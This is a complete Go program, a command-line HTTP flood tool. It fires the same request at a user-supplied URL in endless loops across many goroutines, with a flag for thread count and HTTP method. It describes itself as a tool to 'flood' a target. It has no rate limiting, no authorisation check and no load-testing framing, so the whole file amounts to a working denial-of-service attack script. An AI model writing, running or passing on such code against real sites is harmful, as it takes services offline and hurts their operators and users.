package main

import (
        "flag"
        "fmt"
        "log"
        "sync"

        "github.com/valyala/fasthttp"
)

var target struct {
        url     string
        threads int
        method  string
}

func httpFlood() {
        client := &fasthttp.Client{}
        req := fasthttp.AcquireRequest()
        defer fasthttp.ReleaseRequest(req)

        req.SetRequestURI(target.url)
        req.Header.SetMethod(target.method)

        for {
                if err := client.Do(req, nil); err != nil {
                        fmt.Println("Error:", err)
                        return
                }
        }
}

func main() {
        urlPtr := flag.String("url", "", "URL to flood with requests")
        threadsPtr := flag.Int("threads", 8, "Number of threads")
        methodPtr := flag.String("method", "GET", "HTTP request method")

        flag.Parse()

        target.url = *urlPtr
        target.threads = *threadsPtr
        target.method = *methodPtr

        if target.url == "" {
                log.Println("Please provide a URL to flood using the -url flag.")
                return
        }

        log.Printf("Flooding %s with %d threads...\n", target.url, target.threads)

        var wg sync.WaitGroup
        for i := 0; i < target.threads; i++ {
                wg.Add(1)
                go httpFlood()
        }

        wg.Wait()
}
